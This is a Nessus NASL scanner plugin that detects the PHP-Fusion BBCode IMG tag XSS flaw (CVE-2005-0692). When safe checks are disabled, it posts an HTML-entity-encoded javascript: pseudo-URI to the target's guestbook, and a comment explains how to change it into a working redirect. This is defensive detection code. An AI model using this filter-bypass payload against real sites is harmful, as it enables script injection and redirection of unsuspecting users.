#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(17302);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-0692");
  script_bugtraq_id(12751);
  script_xref(name:"OSVDB", value:"14608");

  script_name(english:"PHP-Fusion BBCode IMG Tag XSS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to cross-
site scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of PHP-Fusion that does not
sufficiently sanitize JavaScript code.  Specifically, an attacker can
inject JavaScript code that bypasses the filters in 'fusion_core.php'
by HTML-encoding it.  This code will then be executed in the context
of a user's browser when he views the malicious BBcode on the remote
host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-03/0122.html" );
 script_set_attribute(attribute:"solution", value:
"Install the 5.01 Service Pack or upgrade to a newer version of
PHP-Fusion." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();

 
  summary["english"] = "Checks for BBCode IMG tag script injection vulnerability in PHP-Fusion";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("php_fusion_detect.nasl", "smtp_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/php-fusion"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Make sure the affected script exists.
  r = http_send_recv3(method:"GET",item:string(dir, "/guestbook.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("<form name='inputform' method='post' action=guestbook.php>" >< res) {
    # If safe checks are enabled...
    if (safe_checks()) {
      # If report_paranoia is paranoid...
      if (report_paranoia > 1) {
        if (ver =~ "^([0-4][.,]|5[.,]00)") { 
          security_warning(port:port, extra: "
***** Nessus has determined the vulnerability exists on the remote
***** host simply by looking at the version number of PHP-Fusion
***** installed there. Since the Service Pack does not change the
***** version number, though, this might be a false positive.\n");
	  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        }
      }
    }
    # Otherwise...
    else {
      # To test, we'll add a message to the guestbook and include an "image".
      # 
      # nb: it's not clear how to do anything other than insert a JavaScript
      #     pseudo-URI; arbitrary code doesn't seem to work. Still, the
      #     trick could be used to redirect users to third-party websites
      #     and cute tricks like that.
      name = "noone";
      from = get_kb_item("SMTP/headers/From");
      if (!from) from = "nobody@example.com";
      # nb: this is the HTML-encoded version of 'javascript:document.nessus="http://www.example.com/"'; eg,
      #     perl -MHTML::Entities -e 'print encode_entities("javascript:document.nessus=\"http://www.example.com/\"", "\000-\255"), "\n";'
      #     change 'nessus' to 'location' to actually add a redirect.
      image = "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#110;&#101;&#115;&#115;&#117;&#115;&#61;&quot;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;&#47;&quot;";
      # nb: and this is the url-encoded version; eg,
      #     perl -MURI::Escape -MHTML::Entities -e 'print uri_escape(encode_entities("javascript:document.nessus=\"http://www.example.com/\"", "\000-\255")), "\n";'
      ue_image = "%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23110%3B%26%23101%3B%26%23115%3B%26%23115%3B%26%23117%3B%26%23115%3B%26%2361%3B%26quot%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23119%3B%26%23119%3B%26%23119%3B%26%2346%3B%26%23101%3B%26%23120%3B%26%2397%3B%26%23109%3B%26%23112%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23109%3B%26%2347%3B%26quot%3B";

      postdata = string(
        "guest_name=", name, "&",
        "guest_email=", from, "&",
        "guest_weburl=&",
        "guest_webtitle=&",
        "guest_message=%5BIMG%5D", ue_image, "%5B%2FIMG%5D&",
        "guest_submit=Submit"
      );
      r = http_send_recv3(method: "POST", version: 11, port: port,
      	item: string(dir, "/guestbook.php"),
	add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
	data: postdata);
      if (isnull(r)) exit(0);
      res = r[2];

      # If the HTML-encoded text came back, there's a problem.
      if (image >< res)
      {
       security_warning(port);
       set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      }
    }
  }
}
